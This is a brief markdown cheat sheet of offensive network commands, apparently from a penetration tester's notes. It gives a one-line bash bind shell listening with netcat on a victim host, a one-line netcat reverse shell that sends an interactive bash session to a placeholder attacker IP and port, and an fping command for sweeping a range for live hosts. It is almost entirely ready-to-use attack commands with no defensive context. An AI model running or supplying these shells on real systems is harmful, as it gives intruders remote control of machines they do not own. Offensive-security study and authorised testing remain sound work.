# Bash - Network

## bash - bind shell to TCP session
```
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l <VICTIM IP> <PORT > /tmp/f
```

## bash - nc - revshell
```
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc <IP> <PORT> > /tmp/f
```

## fping -sweep
```
# `a` to show targets that are alive, `s` to print stats at the end of the scan, `g` to generate a target list from the CIDR network, and `q` to not show per-target results.
fping -asgq <range>
```
